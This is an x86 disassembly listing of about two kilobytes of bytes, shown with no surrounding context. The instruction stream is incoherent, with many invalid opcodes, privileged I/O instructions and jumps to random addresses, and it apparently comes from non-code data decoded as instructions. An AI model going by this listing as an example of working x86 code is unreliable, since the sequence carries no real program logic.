  4105b9:	lea    edi,[ecx+edx*4]
  4105bc:	pop    ss
  4105bd:	loopne 0x4105b3
  4105bf:	add    BYTE PTR [eax-0x61ec5d4c],0x4b
  4105c6:	and    eax,0xb1eb12ac
  4105cb:	sti    
  4105cc:	mov    al,ds:0xe4842112
  4105d1:	push   ebx
  4105d2:	jo     0x410633
  4105d4:	mov    ebx,0x3b089315
  4105d9:	xor    DWORD PTR [ebx+eax*8],0x73
  4105dd:	add    al,0x9c
  4105df:	mov    eax,ds:0x9a42cff1
  4105e4:	pop    edx
  4105e5:	sti    
  4105e6:	lock sti 
  4105e8:	lods   eax,DWORD PTR ds:[esi]
  4105e9:	repnz mov eax,0x8c914c04
  4105ef:	add    eax,0xde49bc40
  4105f4:	mov    bl,0x5a
  4105f6:	sti    
  4105f7:	sbb    BYTE PTR gs:[edx],bh
  4105fa:	cmp    DWORD PTR [edi+0x69],ebx
  4105fd:	ret    
  4105fe:	inc    esi
  4105ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410600:	and    esp,DWORD PTR [ebx-0x2d]
  410603:	xchg   eax,esi
  410605:	inc    edi
  410606:	outs   dx,DWORD PTR ds:[esi]
  410607:	or     bl,BYTE PTR [edi]
  410609:	push   0xac0eb13e
  41060e:	mov    esi,0x9bf717fc
  410613:	push   esp
  410614:	or     al,0xb4
  410616:	mov    fs,WORD PTR [esi+0x3]
  410619:	ja     0x4105e3
  41061b:	call   0xf4d07c7a
  410620:	in     eax,0xb4
  410622:	pop    esi
  410623:	xchg   esi,eax
  410624:	xor    dh,dl
  410626:	and    bh,BYTE PTR [ebp+eax*8-0x243b9922]
  41062d:	pop    fs
  41062f:	jo     0x41068b
  410631:	push   es
  410632:	jbe    0x410680
  410634:	or     DWORD PTR [ecx+0x75],edx
  410637:	mov    al,ds:0xa92e657f
  41063c:	icebp  
  41063d:	lea    edx,[edi+0x592a5f5e]
  410643:	add    eax,0x83fe8307
  410648:	mov    esi,0xf82404c8
  41064d:	or     ah,BYTE PTR [ecx+0x7a]
  410650:	dec    edx
  410651:	push   eax
  410652:	mov    ebp,0xe4c45235
  410657:	jle    0x410667
  410659:	push   esi
  41065a:	out    dx,eax
  41065b:	add    bh,BYTE PTR [esi-0x67]
  41065e:	ficomp DWORD PTR [ebp-0x49e74993]
  410664:	mov    dh,0x2d
  410666:	inc    esi
  410667:	sub    DWORD PTR [esi-0x60],eax
  41066a:	or     BYTE PTR [ecx-0x47bfe5f7],dl
  410670:	adc    esp,edx
  410672:	mov    ds:0x3448769f,al
  410677:	rcl    DWORD PTR [ebx+0x1a89f7e4],cl
  41067d:	loopne 0x4106d0
  41067f:	dec    esp
  410680:	mov    ds:0xbadcd456,eax
  410685:	mov    dl,0xd1
  410687:	cmp    ebx,DWORD PTR [ebp+0x37]
  41068a:	retf   
  41068b:	cmc    
  41068c:	push   ebx
  41068d:	mov    bl,0x3b
  41068f:	dec    ecx
  410690:	jecxz  0x4106fa
  410692:	cmp    eax,0x939a1255
  410697:	repnz (bad) 
  410699:	jno    0x4106a7
  41069b:	or     DWORD PTR [ecx-0xde8e971],0x4b
  4106a2:	cmp    ebp,ecx
  4106a4:	cmc    
  4106a5:	mov    eax,0xbbf24e5a
  4106aa:	gs lahf 
  4106ac:	xchg   ebp,eax
  4106ad:	je     0x41065b
  4106af:	sbb    ecx,esi
  4106b1:	test   eax,0xfb5802b3
  4106b6:	fisubr DWORD PTR ds:0xfbf69d64
  4106bc:	imul   eax,DWORD PTR [edx-0x3a6b61d3],0x7f1d359e
  4106c6:	repz fdivr QWORD PTR cs:[ebx-0x209dce76]
  4106ce:	imul   ebx,eax,0x9acf0f62
  4106d4:	sbb    al,0x3d
  4106d6:	loopne 0x41073f
  4106d8:	or     al,0x9f
  4106da:	and    dh,BYTE PTR [esi-0x28]
  4106dd:	inc    edx
  4106de:	or     eax,0x227519f4
  4106e3:	pop    edx
  4106e4:	mov    cs,WORD PTR [eax]
  4106e6:	xchg   ecx,eax
  4106e7:	xor    esi,DWORD PTR [edx]
  4106e9:	outs   dx,BYTE PTR ds:[esi]
  4106ea:	iret   
  4106eb:	gs (bad) 
  4106ed:	ins    BYTE PTR es:[edi],dx
  4106ee:	sbb    ecx,DWORD PTR [ecx]
  4106f0:	(bad)  
  4106f2:	mov    ah,0xd0
  4106f4:	dec    eax
  4106f5:	cli    
  4106f6:	icebp  
  4106f7:	xor    DWORD PTR [ebx-0x945c493],eax
  4106fd:	sbb    DWORD PTR [ecx+0x41e84c67],ebp
  410703:	call   0x769a5e25
  410708:	dec    BYTE PTR [ebx+0x2b]
  41070b:	ret    0x300e
  41070e:	cmp    DWORD PTR [esi+0x7a3f2c39],eax
  410714:	cmp    bh,BYTE PTR [edx]
  410716:	dec    esi
  410717:	or     edx,ebx
  410719:	inc    eax
  41071a:	push   0xaa7d6307
  41071f:	lahf   
  410720:	mov    eax,ds:0x95009de2
  410725:	lahf   
  410726:	std    
  410727:	out    0x17,al
  410729:	or     eax,0x40a8ee37
  41072e:	neg    dl
  410730:	pop    esp
  410731:	pop    esp
  410732:	inc    esp
  410733:	mov    es,WORD PTR [ebx]
  410735:	inc    ecx
  410736:	xchg   ebp,eax
  410737:	or     eax,0x2db19c
  41073c:	dec    ecx
  41073d:	outs   dx,BYTE PTR ds:[esi]
  41073e:	shr    BYTE PTR [eax],1
  410740:	sbb    ecx,DWORD PTR [ecx-0x6fea7112]
  410746:	lahf   
  410747:	mov    esp,0xbd5ee230
  41074c:	icebp  
  41074d:	mov    dl,0x68
  41074f:	dec    esp
  410750:	std    
  410751:	push   es
  410752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410753:	sbb    eax,esp
  410755:	push   ss
  410756:	push   edi
  410757:	cwde   
  410758:	sar    BYTE PTR [eax+0xb10eece],1
  41075e:	mov    BYTE PTR [ecx],cl
  410760:	(bad)
  410763:	sub    BYTE PTR [eax+0x573cac1f],dl
  410769:	in     eax,0xf5
  41076b:	iret   
  41076c:	lds    esi,FWORD PTR [esi]
  41076e:	outs   dx,DWORD PTR ds:[esi]
  41076f:	pop    esi
  410770:	jne    0x41071b
  410772:	xor    ch,bh
  410774:	jmp    0x410741
  410776:	adc    ebp,ebp
  410778:	out    dx,eax
  410779:	popf   
  41077a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41077b:	aaa    
  41077c:	sahf   
  41077d:	sti    
  41077e:	adc    DWORD PTR ds:[edi],edi
  410781:	jmp    0x71f9:0x7a09e5a6
  410788:	mov    DWORD PTR fs:[esi],0x45eb7910
  41078f:	inc    ebp
  410790:	mov    ebx,0xa577d5bb
  410795:	mov    ebx,0xec7b3fdc
  41079a:	mov    esp,0x63fbd396
  41079f:	sub    al,0x8d
  4107a1:	cmp    dh,BYTE PTR fs:[ecx-0x25270584]
  4107a8:	xchg   ebx,eax
  4107a9:	add    BYTE PTR [eax],dh
  4107ab:	dec    ebx
  4107ac:	inc    edi
  4107ad:	inc    ecx
  4107ae:	mov    DWORD PTR [esi-0x6bb46f04],ebp
  4107b4:	push   edi
  4107b5:	enter  0xa193,0x42
  4107b9:	lods   eax,DWORD PTR ds:[esi]
  4107ba:	ins    DWORD PTR es:[edi],dx
  4107bb:	imul   edx,DWORD PTR [eax],0xfe449a4b
  4107c1:	jbe    0x4107e2
  4107c3:	and    DWORD PTR [ebp-0x68a4a524],esp
  4107c9:	xor    dh,BYTE PTR [ebx]
  4107cb:	leave  
  4107cc:	stc    
  4107cd:	lds    eax,FWORD PTR [edx-0x1]
  4107d0:	rol    DWORD PTR [edx],1
  4107d2:	shr    BYTE PTR [eax-0x27],cl
  4107d5:	call   0x714e5083
  4107da:	in     eax,0xcb
  4107dc:	inc    esi
  4107dd:	inc    ebp
  4107de:	or     DWORD PTR gs:[edx+0x3c],esi
  4107e2:	test   DWORD PTR [esp+edx*4+0x63db0108],ecx
  4107e9:	loopne 0x41081f
  4107eb:	push   cs
  4107ec:	inc    edx
  4107ed:	inc    esp
  4107ee:	stc    
  4107ef:	xchg   edi,eax
  4107f0:	mov    dh,0x9
  4107f2:	xchg   ebx,eax
  4107f3:	ss loop 0x410799
  4107f6:	fwait
  4107f7:	int    0xf1
  4107f9:	repz mov eax,0x3fb86683
  4107ff:	ret    0xb1df
  410802:	iret   
  410803:	cdq    
  410804:	jmp    0x41084f
  410806:	sbb    eax,0xdfad1e19
  41080b:	jge    0x4107e5
  41080d:	das    
  41080e:	cwde   
  41080f:	xor    ah,BYTE PTR [ecx-0x2f]
  410812:	adc    esp,DWORD PTR [edx-0x5a]
  410815:	mov    edx,ebp
  410817:	or     ebp,0xc7073973
  41081d:	add    BYTE PTR [edi],ch
  41081f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410820:	mov    dh,0xa9
  410822:	jnp    0x41083a
  410824:	pop    ss
  410825:	shl    DWORD PTR [edi-0x2620fd79],0x6d
  41082c:	xor    BYTE PTR [ebp-0x75087daf],dh
  410832:	hlt    
  410833:	sbb    DWORD PTR [ebx+0x70],edi
  410836:	or     eax,0xf1d951a1
  41083b:	aad    0xbb
  41083d:	dec    ebp
  41083e:	mov    dh,0x76
  410840:	in     eax,dx
  410841:	mov    dl,0x6a
  410843:	adc    esi,DWORD PTR [ecx+eax*4-0x4fe2b6f9]
  41084a:	fs ins BYTE PTR es:[edi],dx
  41084c:	ds es daa 
  41084f:	or     DWORD PTR ds:0x4a494b5f,eax
  410855:	sbb    DWORD PTR ds:0xc1fdb317,ecx
  41085b:	adc    ebx,DWORD PTR [ebp-0x36]
  41085e:	stos   DWORD PTR es:[edi],eax
  41085f:	jmp    0x55352f34
  410864:	sbb    esp,DWORD PTR [esi+eax*2]
  410867:	add    eax,0x4cfbc854
  41086c:	xor    ebx,DWORD PTR [esi+0x3f]
  41086f:	xchg   edi,eax
  410870:	stos   DWORD PTR es:[edi],eax
  410871:	xchg   ebp,eax
  410872:	mov    ?,WORD PTR [esi]
  410874:	jp     0x410876
  410876:	fisubr DWORD PTR [edi]
  410878:	into   
  410879:	addr16 jge 0x41080c
  41087c:	pop    esp
  41087d:	ret    0x3dbd
  410880:	ss fcmovnbe st,st(0)
  410883:	sub    ebx,DWORD PTR [edx]
  410885:	mov    al,ds:0x3af7a249
  41088a:	popa   
  41088b:	jp     0x4108c1
  41088d:	lds    ecx,FWORD PTR [esi]
  41088f:	hlt    
  410890:	aam    0x34
  410892:	sub    ebp,DWORD PTR [edi+0x65]
  410895:	xor    edi,esp
  410897:	out    dx,al
  410898:	add    ecx,edx
  41089a:	mov    bl,BYTE PTR [ebx]
  41089c:	mov    esi,0x2aba547a
  4108a1:	sbb    BYTE PTR cs:[ecx],dh
  4108a4:	int3   
  4108a5:	fcmovb st,st(5)
  4108a7:	test   DWORD PTR [ebx],ecx
  4108a9:	adc    al,0x1b
  4108ab:	inc    edi
  4108ac:	push   ss
  4108ad:	imul   esi,DWORD PTR [eax],0x7f
  4108b0:	pop    eax
  4108b1:	aas    
  4108b2:	jne    0x410887
  4108b4:	ret    
  4108b5:	sbb    al,bh
  4108b7:	push   eax
  4108b8:	cmp    BYTE PTR [ecx],bl
  4108ba:	push   ecx
  4108bb:	pop    edx
  4108bc:	out    0x6f,eax
  4108be:	or     eax,0x75c7fad9
  4108c3:	xchg   ebx,eax
  4108c4:	fs and eax,0x15405189
  4108ca:	pop    ecx
  4108cb:	adc    BYTE PTR [esi-0x422c9dcd],bl
  4108d1:	xchg   ebx,eax
  4108d2:	(bad)  
  4108d3:	and    DWORD PTR [edi+0x5d],esp
  4108d6:	dec    esi
  4108d7:	and    esp,DWORD PTR [eax]
  4108d9:	pushf  
  4108da:	jecxz  0x4108df
  4108dc:	cdq    
  4108dd:	and    eax,edi
  4108df:	hlt    
  4108e0:	xor    esp,DWORD PTR [ebx-0x42]
  4108e3:	mov    dl,0xd0
  4108e5:	cwde   
  4108e6:	sub    al,al
  4108e8:	retf   0xd765
  4108eb:	sbb    ebp,esp
  4108ed:	repnz ficom DWORD PTR [ecx]
  4108f0:	pop    esi
  4108f1:	inc    ebp
  4108f2:	and    BYTE PTR [eax+0x38],bl
  4108f5:	mov    WORD PTR [edi+0x4694b2f1],es
  4108fb:	or     edi,DWORD PTR [ecx+0x15]
  4108fe:	cdq    
  4108ff:	dec    ebp
  410900:	xchg   DWORD PTR [edx-0x3cf4a176],esi
  410906:	aaa    
  410907:	and    eax,0x5be5589d
  41090c:	or     eax,0x136c81ff
  410911:	and    BYTE PTR [eax-0x61],dh
  410914:	fsub   st,st(6)
  410916:	dec    edi
  410917:	imul   ebx,DWORD PTR [ebx+edi*2],0x27
  41091b:	fst    DWORD PTR ds:0xae8448a3
  410921:	sub    BYTE PTR [edi-0x55],ah
  410924:	mov    edi,0x719bd478
  410929:	(bad)  
  41092b:	aaa    
  41092c:	jns    0x4109a9
  41092e:	or     eax,0x3db44d9
  410933:	and    DWORD PTR [ecx-0x7f8d64c2],esi
  410939:	xchg   esi,eax
  41093a:	and    BYTE PTR [edx+esi*4],bh
  41093d:	xor    BYTE PTR [esi-0x1b],ah
  410940:	(bad)
  410944:	dec    ebp
  410945:	or     eax,0x27c7f043
  41094a:	mov    bl,0xa2
  41094c:	mov    al,ds:0x452d2c55
  410951:	and    DWORD PTR [ecx-0x5d],0x40
  410955:	xchg   ebp,eax
  410956:	scas   eax,DWORD PTR es:[edi]
  410957:	test   eax,0x2edba6d7
  41095c:	sbb    edx,DWORD PTR [ebx+0x1a242244]
  410962:	call   0xdf68:0x6071d5f2
  410969:	loopne 0x410902
  41096b:	ror    DWORD PTR [esi+0x49],0x40
  41096f:	sti    
  410970:	test   BYTE PTR [edi],ch
  410972:	out    0xbb,eax
  410974:	das    
  410975:	mul    DWORD PTR [edx-0x5490b43e]
  41097b:	outs   dx,BYTE PTR ds:[esi]
  41097c:	add    ah,dl
  41097e:	mov    ebp,esi
  410980:	add    DWORD PTR [edx],ecx
  410982:	mov    DWORD PTR [ebx-0x461cbc1],ebx
  410988:	pop    ebx
  410989:	adc    ch,BYTE PTR cs:[ebx*4+0x2f50cf3f]
  410991:	dec    ebx
  410992:	fs add eax,0xfc4e64c3
  410998:	in     al,0x36
  41099a:	test   DWORD PTR [edx-0x15c3e4ce],ebp
  4109a0:	mov    dh,BYTE PTR [ecx]
  4109a2:	mov    ds:0x11e368b7,al
  4109a7:	push   cs
  4109a8:	ds (bad) 
  4109aa:	into   
  4109ab:	inc    ecx
  4109ac:	mov    edx,DWORD PTR [ecx+0x6c]
  4109af:	mov    al,ds:0x18d06fd5
  4109b4:	push   ebx
  4109b5:	lods   eax,DWORD PTR ds:[esi]
  4109b6:	mov    eax,0x47b585d0
  4109bb:	inc    eax
  4109bc:	fiadd  DWORD PTR [ebx+0x37aeea05]
  4109c2:	and    al,0x12
  4109c4:	pop    ebp
  4109c5:	retf   0x4c0b
  4109c8:	add    DWORD PTR [edx-0x10],edi
  4109cb:	ror    bh,1
  4109cd:	adc    dh,0x43
  4109d0:	jne    0x410a40
  4109d2:	or     al,0xd9
  4109d4:	or     ecx,edi
  4109d6:	xchg   esi,eax
  4109d7:	fwait
  4109d8:	mov    edi,0x958b32a0
  4109dd:	or     bh,ch
  4109df:	xchg   ebx,eax
  4109e0:	adc    al,BYTE PTR ss:[esi-0x84436b2]
  4109e7:	sub    BYTE PTR [edx-0x3f39059e],0xb
  4109ee:	loopne 0x4109ed
  4109f0:	lds    ebx,FWORD PTR [eax+ecx*1+0x66a8999b]
  4109f7:	out    dx,eax
  4109f8:	ror    DWORD PTR [eax-0x7a],0x1c
  4109fc:	aad    0xac
  4109fe:	adc    BYTE PTR [ebx+0x52],ch
  410a01:	pop    edi
  410a02:	fwait
  410a03:	mov    eax,ds:0xd25cd251
  410a08:	jle    0x4109c1
  410a0a:	test   al,0x67
  410a0c:	div    BYTE PTR [esi]
  410a0e:	xchg   esi,eax
  410a0f:	cmp    al,0x31
  410a11:	int3   
  410a12:	push   0x73f1e241
  410a17:	mov    ah,0x0
  410a19:	push   ebp
  410a1a:	stos   BYTE PTR es:[edi],al
  410a1b:	jno    0x4109f7
  410a1d:	xor    DWORD PTR [edi-0x5838ca19],0x78b57a15
  410a27:	shr    al,cl
  410a29:	mov    DWORD PTR [edi+0x60d4ac3d],0xbc85ae1d
  410a33:	arpl   cx,bp
  410a35:	lods   al,BYTE PTR ds:[esi]
  410a36:	dec    esp
  410a37:	call   0x3eb1c971
  410a3c:	mov    al,0xe5
  410a3e:	nop
  410a3f:	outs   dx,DWORD PTR ds:[esi]
  410a40:	cmp    BYTE PTR [ebx-0x5b],ah
  410a43:	sbb    dh,al
  410a45:	les    esi,FWORD PTR [edx+0x4f]
  410a48:	adc    esi,DWORD PTR [edi]
  410a4a:	sbb    ah,al
  410a4c:	and    DWORD PTR [esi],edi
  410a4e:	fimul  DWORD PTR [ecx+eax*1-0x71]
  410a52:	lahf   
  410a53:	and    al,0x5c
  410a55:	fdiv   st,st(6)
  410a57:	mov    cl,0x26
  410a59:	xchg   esp,eax
  410a5a:	and    eax,0x864212a1
  410a5f:	and    eax,0xe45cfed2
  410a64:	cs hlt 
  410a66:	and    al,BYTE PTR [edx+edi*8+0x57]
  410a6a:	adc    DWORD PTR [ecx-0x19],edx
  410a6d:	mov    ah,0x1a
  410a6f:	pop    edx
  410a70:	stos   DWORD PTR es:[edi],eax
  410a71:	push   ss
  410a72:	jno    0x410a82
  410a74:	add    ah,BYTE PTR [ebp-0x4b7e7039]
  410a7a:	or     DWORD PTR [edi-0x41738891],edi
  410a80:	add    BYTE PTR [esi+0x1b],ah
  410a83:	idiv   BYTE PTR [ebx+0x4c025760]
  410a89:	call   0x217f:0x31183675
  410a90:	push   ds
  410a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a92:	sub    al,0x52
  410a94:	and    cl,BYTE PTR [edi+edi*1+0x1c]
  410a98:	and    ah,BYTE PTR [esi+edi*8]
  410a9b:	stos   BYTE PTR es:[edi],al
  410a9c:	xchg   ebp,eax
  410a9d:	xlat   BYTE PTR cs:[ebx]
  410a9f:	hlt    
  410aa0:	cli    
  410aa1:	push   edi
  410aa2:	(bad)  
  410aa4:	les    ecx,FWORD PTR [ebp-0x6f3caf7c]
  410aaa:	mov    edi,0x74abc4c5
  410aaf:	sbb    bl,BYTE PTR [ebx]
  410ab1:	sbb    al,0x91
  410ab3:	aaa    
  410ab4:	push   ebp
  410ab5:	je     0x410a9b
  410ab7:	fisub  DWORD PTR [ebx-0x67]
  410aba:	rol    DWORD PTR [ecx-0x2b],cl
  410abd:	pop    esp
  410abe:	jecxz  0x410ae7
  410ac0:	pop    esp
  410ac1:	mov    edi,fs
  410ac3:	jno    0x410aa6
  410ac5:	cmp    cl,ch
  410ac7:	add    eax,0x6c98d876
  410acd:	nop
  410ace:	cmp    al,0x44
  410ad0:	pusha  
  410ad1:	dec    edx
  410ad2:	or     eax,0x986ac764
  410ad7:	popf   
  410ad8:	jne    0x410b1a
  410ada:	push   ebp
  410adb:	es ins DWORD PTR es:[edi],dx
  410add:	pop    eax
  410ade:	test   al,0xea
  410ae0:	xor    al,BYTE PTR [edi+0x7b72f15a]
  410ae6:	aas    
  410ae7:	pop    edi
  410ae8:	xor    al,0xa8
  410aea:	xchg   edx,eax
  410aeb:	mov    esi,0xf55ce98
  410af0:	add    edi,DWORD PTR [esi+edx*2-0x31]
  410af4:	das    
  410af5:	pusha  
  410af6:	fisttp QWORD PTR [edi-0x364e39a2]
  410afc:	xlat   BYTE PTR ds:[ebx]
  410afd:	add    eax,0xca320c5e
  410b02:	mov    ds:0x2d2d6f4a,al
  410b07:	adc    eax,0xd792827f
  410b0c:	mov    bl,0x79
  410b0e:	xchg   ebx,eax
  410b0f:	add    ecx,DWORD PTR [edx]
  410b11:	and    BYTE PTR [ebx],0x2
  410b14:	jg     0x410b1f
  410b16:	hlt    
  410b17:	mov    fs,WORD PTR [esi+0xa2510a9]
  410b1d:	ins    BYTE PTR es:[edi],dx
  410b1e:	imul   edx,DWORD PTR [ebx],0xffffff88
  410b21:	out    0x60,al
  410b23:	push   esi
  410b24:	jns    0x410b90
  410b26:	ja     0x410b1a
  410b28:	outs   dx,DWORD PTR ds:[esi]
  410b29:	test   al,0x52
  410b2b:	jns    0x410b82
  410b2d:	mov    ds:0x10624c99,al
  410b32:	sub    bl,BYTE PTR [edi]
  410b34:	or     al,0x1f
  410b36:	xchg   esi,eax
  410b37:	and    BYTE PTR [esi+0x55],bl
  410b3a:	sbb    DWORD PTR [edx+0x71],0xffffffad
  410b3e:	jmp    0x410b79
  410b40:	mov    edx,0xaa5459ae
  410b45:	xor    ecx,DWORD PTR [esi]
  410b47:	pushf  
  410b48:	or     edi,edi
  410b4a:	out    0x94,al
  410b4c:	loop   0x410adc
  410b4e:	xor    BYTE PTR [edi-0x7d7e38a5],ah
  410b54:	mov    ch,0xce
  410b56:	lods   al,BYTE PTR ds:[esi]
  410b57:	inc    esp
  410b58:	xchg   BYTE PTR es:[edi+0xaf4f1d8],cl
  410b5f:	xchg   ecx,eax
  410b60:	fnsave [ebx-0xc]
  410b63:	(bad)  
  410b65:	cmp    ebp,DWORD PTR [esi]
  410b67:	dec    esp
  410b68:	fs or  eax,0x29953957
  410b6e:	dec    esp
  410b6f:	cdq    
  410b70:	and    eax,DWORD PTR [edi+0x5d]
  410b73:	enter  0x8c5b,0x6f
  410b77:	paddq  mm7,QWORD PTR [eax-0x1a]
  410b7b:	test   BYTE PTR [ebx+eiz*2],ah
  410b7e:	xor    al,0x71
  410b80:	cli    
  410b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b82:	pushf  
  410b83:	add    eax,0xd75c39ad
  410b88:	cdq    
  410b89:	pop    eax
  410b8a:	mov    esi,0xd7b108b5
  410b8f:	js     0x410bf5
  410b91:	push   ds
  410b92:	stc    
  410b93:	daa    
  410b94:	inc    edx
  410b95:	xor    ch,BYTE PTR [esi-0x11fd36d]
  410b9b:	push   0x3b
  410b9d:	inc    edi
  410b9e:	sbb    BYTE PTR [ebx-0x3c74fd11],dh
  410ba4:	fsubr  DWORD PTR [edi+0x6a]
  410ba7:	pop    es
  410ba8:	cwde   
  410ba9:	loop   0x410b99
  410bab:	call   0xaa08cea3
  410bb0:	ja     0x410ba7
  410bb2:	push   ebp
  410bb3:	out    dx,al
  410bb4:	outs   dx,BYTE PTR ds:[esi]
  410bb5:	clc    
  410bb6:	jmp    0xb3f0422c
  410bbb:	mov    bh,0xee
  410bbd:	aaa    
  410bbe:	adc    al,0xdf
  410bc0:	jp     0x410b52
  410bc2:	fidiv  WORD PTR [edx+0x4f1296b1]
  410bc8:	jmp    0x10bb:0x69dade10
  410bcf:	ins    DWORD PTR es:[edi],dx
  410bd0:	ret    
  410bd1:	inc    edi
  410bd2:	push   es
  410bd3:	(bad)  
  410bd4:	jno    0x410c2c
  410bd6:	imul   edx,ebx,0x8c6b2309
  410bdc:	fxch   st(3)
  410bde:	call   0x9719:0x99b8b9e3
  410be5:	cmp    edx,DWORD PTR [ebx+0x15d776c0]
  410beb:	repnz xchg esp,eax
  410bed:	push   ecx
  410bee:	dec    esp
  410bef:	add    esp,DWORD PTR [esi+0x5]
  410bf2:	sbb    DWORD PTR cs:[edx+eiz*8+0x6b0e34b9],eax
  410bfa:	sbb    eax,DWORD PTR [eax-0x65e7ab81]
  410c00:	sar    DWORD PTR [ecx],cl
  410c02:	(bad)  
  410c03:	pop    eax
  410c04:	jg     0x410c0b
  410c06:	xor    esp,DWORD PTR ds:[edi+0x37]
  410c0a:	sbb    al,0xf7
  410c0c:	sbb    BYTE PTR [ebp-0x5ecd95d0],0x3a
  410c13:	popa   
  410c14:	int    0x3e
  410c16:	sahf   
  410c17:	lds    edi,FWORD PTR [edx+0xf]
  410c1a:	ret    
  410c1b:	push   esi
  410c1c:	inc    eax
  410c1d:	pop    es
  410c1e:	jl     0x410c9b
  410c20:	inc    ebp
  410c21:	jl     0x410bef
  410c23:	(bad)  
  410c25:	mov    es,WORD PTR [ecx]
  410c27:	les    ebp,FWORD PTR [edx-0xf]
  410c2a:	jecxz  0x410bf1
  410c2c:	and    BYTE PTR [eax],0x3a
  410c2f:	rcl    BYTE PTR [eax+edi*8-0x49],cl
  410c33:	cmp    eax,0x990af726
  410c38:	or     DWORD PTR [eax+0x3368448e],eax
  410c3e:	stos   BYTE PTR es:[edi],al
  410c3f:	sahf   
  410c40:	xlat   BYTE PTR ds:[ebx]
  410c41:	dec    eax
  410c42:	lock (bad) [edx-0x1a78e0d2]
  410c49:	push   ds
  410c4a:	shr    BYTE PTR [edi+esi*1-0x72],0x22
  410c4f:	dec    ebx
  410c50:	pop    eax
  410c51:	push   edx
  410c52:	clc    
  410c53:	nop
  410c54:	fmulp  st(7),st
  410c56:	push   es
  410c57:	mov    dh,al
  410c59:	pop    esp
  410c5a:	sbb    eax,0x68a37bc2
  410c5f:	pop    esi
  410c60:	inc    ebp
  410c61:	inc    edx
  410c62:	lds    esi,FWORD PTR [edx-0x3c]
  410c65:	add    ah,BYTE PTR [ecx]
  410c67:	and    al,0x62
  410c69:	cmp    BYTE PTR [edi+0x2c],dh
  410c6c:	jmp    0x410bf3
  410c6e:	fnstcw WORD PTR [eax]
  410c70:	mov    ds,WORD PTR [ebp+eiz*4+0x70058e55]
  410c77:	jg     0x410c90
  410c79:	ins    BYTE PTR es:[edi],dx
  410c7a:	inc    edi
  410c7b:	xchg   ecx,eax
  410c7c:	push   esi
  410c7d:	bound  ebp,QWORD PTR [esi]
  410c7f:	add    DWORD PTR [edx+0x45fde605],ebx
  410c85:	ds jmp 0xcae8a097
  410c8b:	and    BYTE PTR [ecx],bl
  410c8d:	inc    ecx
  410c8e:	inc    esi
  410c8f:	push   ebp
  410c90:	ds mov al,0xfa
  410c93:	sub    eax,0x50c0bcd3
  410c98:	mov    ds:0x3d6e1e35,eax
  410c9d:	test   BYTE PTR [eax-0x650e255d],ch
  410ca3:	ret    
  410ca4:	xor    esi,DWORD PTR [esi+edx*8+0x43]
  410ca8:	(bad)  
  410ca9:	sti    
  410caa:	loopne 0x410cda
  410cac:	rcr    edi,1
  410cae:	test   al,0x1c
  410cb0:	jns    0x410c3e
  410cb2:	adc    cl,BYTE PTR [esi]
  410cb4:	mov    eax,0x2d0b5220
  410cb9:	dec    ebp
  410cba:	fwait
  410cbb:	jns    0x410c9c
  410cbd:	xor    BYTE PTR [ebp+0x2d],dl
  410cc0:	push   esi
  410cc1:	js     0x410d30
  410cc3:	fnsave [esi]
  410cc5:	or     eax,0x708bff37
  410cca:	aam    0xd8
  410ccc:	or     BYTE PTR [edi+0x32df3002],dl
  410cd2:	sti    
  410cd3:	or     al,0xb
  410cd5:	sar    al,cl
  410cd7:	mov    BYTE PTR [ebx],bh
  410cd9:	push   edi
  410cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cdb:	imul   ebx,DWORD PTR [edi-0x69],0xffffffe8
  410cdf:	outs   dx,DWORD PTR ds:[esi]
  410ce0:	into   
  410ce1:	and    DWORD PTR ds:0x65b87710,esi
  410ce7:	repnz retf 0x475d
  410ceb:	push   esp
  410cec:	ret    0x13df
  410cef:	or     cl,ch
  410cf1:	jmp    0x410c89
  410cf3:	add    ecx,DWORD PTR ds:0x304775d6
  410cf9:	mov    ds:0x50956161,eax
  410cfe:	mov    ax,ds:0x8eeccf34
  410d04:	mov    dh,0xe0
  410d06:	mov    ebx,0x8e0f91ba
  410d0b:	xchg   esp,eax
  410d0c:	xor    DWORD PTR [edx],ecx
  410d0e:	mov    ebp,0x7cfcb268
  410d13:	jmp    0x3354118b
  410d18:	icebp  
  410d19:	cmp    eax,ecx
  410d1b:	bound  ebx,QWORD PTR [edi-0x70]
  410d1e:	pop    ebx
  410d1f:	push   0xffffff9d
  410d21:	mov    ah,0x6b
  410d23:	xor    esp,edi
  410d25:	js     0x410cfc
  410d27:	inc    esi
  410d28:	inc    edx
  410d29:	stos   BYTE PTR es:[edi],al
  410d2a:	add    ah,ch
  410d2c:	arpl   WORD PTR [esi-0x60fa0b11],cx
  410d32:	adc    ebx,0x38
  410d35:	sbb    DWORD PTR [ebx-0x73],ecx
  410d38:	pop    ebx
  410d39:	test   DWORD PTR [ebx-0x3d319d9e],esp
  410d3f:	stos   BYTE PTR es:[edi],al
  410d40:	pop    eax
  410d41:	into   
  410d42:	mov    DWORD PTR [esi-0x4ab2cd8b],0x6a3bd935
  410d4c:	jge    0x410d22
  410d4e:	repnz ss mov edi,0xbe4ad5bf
  410d55:	cmp    BYTE PTR [edx-0x38f3612f],bh
  410d5b:	dec    esp
  410d5c:	rcl    BYTE PTR [eax],1
  410d5e:	(bad)  
  410d5f:	jnp    0x410cfa
  410d61:	mov    cl,0x7e
  410d63:	mov    ds:0xdd1d09cd,al
  410d68:	in     al,dx
  410d69:	and    BYTE PTR [ebp-0x61],bl
  410d6c:	test   al,0x5a
  410d6e:	outs   dx,BYTE PTR ds:[esi]
  410d6f:	fldlg2 
  410d71:	sbb    bl,BYTE PTR ds:0x9210c0ab
  410d77:	jmp    0xec22e5ba
  410d7c:	fimul  WORD PTR [esi+ebx*1]
  410d7f:	das    
  410d80:	or     DWORD PTR [ebx+esi*8-0x205c98ae],ebx
  410d87:	lock mov ah,BYTE PTR [esi-0x7ba7e121]
  410d8e:	out    dx,eax
  410d8f:	xchg   edi,eax
  410d90:	add    al,0x61
  410d92:	(bad)  
  410d93:	jmp    0xe665d0e4
  410d98:	push   esi
  410d99:	dec    edi
  410d9a:	clc    
  410d9b:	(bad)  
  410d9d:	loope  0x410d98
  410d9f:	cmp    ch,BYTE PTR [ebx+0x38]
  410da2:	loope  0x410dbf
  410da4:	and    edi,esi
